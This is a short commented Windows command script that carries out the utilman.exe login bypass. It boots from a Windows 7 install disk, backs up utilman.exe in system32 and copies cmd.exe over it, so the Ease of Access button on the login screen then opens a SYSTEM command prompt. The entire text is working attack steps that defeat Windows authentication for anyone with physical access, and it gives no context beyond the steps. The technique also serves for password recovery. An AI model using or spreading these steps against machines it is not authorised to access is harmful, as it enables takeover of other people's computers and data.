:: After booting into a bootable Windows 7 installation disk, navigate to the CMD terminal, and find your filesystem
D:

:: Navigate to the D:\Windows\system32
cd D:\Windows\system32

:: Rename utilman.exe
ren utilman.exe utilman_bak.exe

:: Copy cmd.exe to become utilman.exe
copy cmd.exe utilman.exe 

:: Exit CMD prompt
exit

:: Restart Windows, and boot into OS found on hard drive



